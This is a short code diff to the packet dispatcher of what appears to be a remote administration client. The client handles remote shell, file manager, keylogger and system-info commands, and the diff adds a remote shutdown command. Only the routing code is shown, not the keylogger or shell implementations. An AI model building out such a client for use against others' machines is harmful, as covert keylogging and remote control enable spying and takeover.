@@ -1,4 +1,6 @@
 using System;
+using System.Diagnostics.Contracts;
+using System.Net.WebSockets;
 using Common.Enums;
 using Common.Networking;
 using Common.Utils;
@@ -14,8 +16,9 @@ namespace Client.Networking
         private readonly Action<KeyLoggerStop>? _onKeyLoggerStop;
         private readonly Action<KeyLoggerLangToggle>? _onKeyLoggerLangToggle;
         private readonly Action<MessageBoxRequest> _onMessageBoxRequest;
+        private readonly Action<ShutdownActionRequest> _onShutdownActionRequest;
 
-        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest,Action<MessageBoxRequest> onMessageBoxRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
+        public PacketHandler(Action<SystemInfoRequest> onSystemInfoRequest, Action<RemoteShellRequest> onRemoteShellRequest, Action<FileManagerRequest> onFileManagerRequest,Action<MessageBoxRequest> onMessageBoxRequest, Action<ShutdownActionRequest> onShutdownActionRequest, Action<KeyLoggerStart>? onKeyLoggerStart = null, Action<KeyLoggerStop>? onKeyLoggerStop = null, Action<KeyLoggerLangToggle>? onKeyLoggerLangToggle = null)
         {
             _onSystemInfoRequest = onSystemInfoRequest;
             _onRemoteShellRequest = onRemoteShellRequest;
@@ -24,6 +27,7 @@ namespace Client.Networking
             _onKeyLoggerStop = onKeyLoggerStop;
             _onKeyLoggerLangToggle = onKeyLoggerLangToggle;
             _onMessageBoxRequest = onMessageBoxRequest;
+            _onShutdownActionRequest = onShutdownActionRequest;
         }
 
         public void HandleLine(string json)
@@ -86,6 +90,13 @@ namespace Client.Networking
                         if (msgReq != null)
                         {
                             _onMessageBoxRequest(msgReq);
+                        }
+                        break;
+                    case PacketType.ShutdownActionRequest:
+                        var sdReq = JsonHelper.Deserialize<ShutdownActionRequest>(json);
+                        if (sdReq != null)
+                        {
+                            _onShutdownActionRequest(sdReq);
                         }
                         break;
                     default:
